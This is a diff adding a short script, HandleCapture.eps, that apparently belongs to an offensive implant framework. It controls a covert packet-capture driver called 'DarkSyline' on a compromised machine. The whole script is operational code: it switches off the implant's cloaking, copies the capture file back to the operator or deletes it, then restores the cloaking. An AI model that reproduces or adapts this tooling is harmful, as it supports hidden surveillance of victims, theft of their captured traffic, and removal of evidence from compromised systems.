@@ -1,0 +1,105 @@
+#--------------------------------------------------------
+# File: HandleCapture.eps
+#
+# Handle DarkSyline capture file
+#
+# Modifications:
+#  01/13/2003	Created.
+#  05/03/2004	Updated to handle non-default capture file
+#--------------------------------------------------------
+@include "_GetSystemPaths.epm";
+@include "Include\\DsIncludes.epm";
+@include "getResDir.eps";
+@include "cloak.eps";
+
+@echo off;
+
+string $usage = "Usage: $argv[0] <driverName> <cloaker> <delete|get> <captureFile>";
+
+if ($argc != 5) {
+  echo "$usage";
+  return false;
+}
+
+string $driver = $argv[1];
+string $cloaker = $argv[2];
+string $action = $argv[3];
+string $captureFile = $argv[4];
+
+string $resPath;
+getResDirectory($resPath);
+
+if (($action != "get") && ($action != "delete")) {
+  echo $usage;
+  return false;
+}
+
+if ($action == "delete") {
+  ifnot (prompt "Are you sure you want to delete the capture file?") {
+    return false;	
+  }
+}
+
+# convert capture file path to user-mode
+DsGetUserModePath($captureFile);
+
+string $parts = SplitPath($captureFile);
+string $path = $parts[0];
+string $file = $parts[1];
+
+@echo on;
+echo "- Decloaking";
+@echo off;
+
+ifnot(cloakIt($argv[2], $resPath, "enable")) {
+  echo "  - EP couldn't gain uncloaked privileges";
+  echo "  - Going to try operation anyhow";
+  @echo off;
+}
+
+bool $rtn;
+
+if ($action == "get") {
+  
+  echo "Getting '$path\\$file'";
+  $rtn = `get "$path\\$file" -foreground`;
+  if ($rtn) {
+    echo "    SUCCESS";
+  } 
+  else {
+    echo "    FAILED";
+  }
+  
+  #return $rtn;
+  
+} 
+else if ($action == "delete") {
+  
+  echo "Deleting $path\\$file";
+  $rtn = `del "$file" -path "$path"`;
+  if ($rtn){
+    echo "    DELETED";
+  }
+  else {
+    echo "    FAILED";
+  }
+  
+} 
+else {
+  echo "Unknown action ($action)";
+  return false;
+}    
+
+@echo on;
+echo "- Cloaking";
+@echo off;
+
+ifnot(cloakIt($argv[2], $resPath, "disable")) {
+  @echo on;
+  echo "- EP couldn't recloak - proceed with caution";
+  @echo off;
+}
+
+
+
+return $rtn;
